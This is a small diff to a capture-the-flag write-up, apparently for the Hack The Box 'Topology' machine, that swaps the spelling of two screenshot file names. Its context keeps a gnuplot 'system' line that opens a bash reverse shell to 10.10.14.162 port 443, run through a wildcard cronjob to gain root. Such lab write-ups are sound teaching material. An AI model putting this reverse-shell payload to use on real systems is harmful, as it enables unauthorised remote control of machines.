@@ -206,11 +206,11 @@ So because the cronjob above is using wildcards and executing with gnuplot any `
 system "bash -c 'bash -i >& /dev/tcp/10.10.14.162/443 0>&1'"
 ```
 
-![htb_topology_shell.png](../assets/topology_assets/htb_topology_shell.png)
+![htb_tolology_shell.png](../assets/topology_assets/htb_tolology_shell.png)
 
 Nice, we can now grab the final flag:
 
-![htb_tolology_root.png](../assets/topology_assets/htb_tolology_root.png)
+![htb_topology_root.png](../assets/topology_assets/htb_topology_root.png)
 
 Thanks for following along!
 
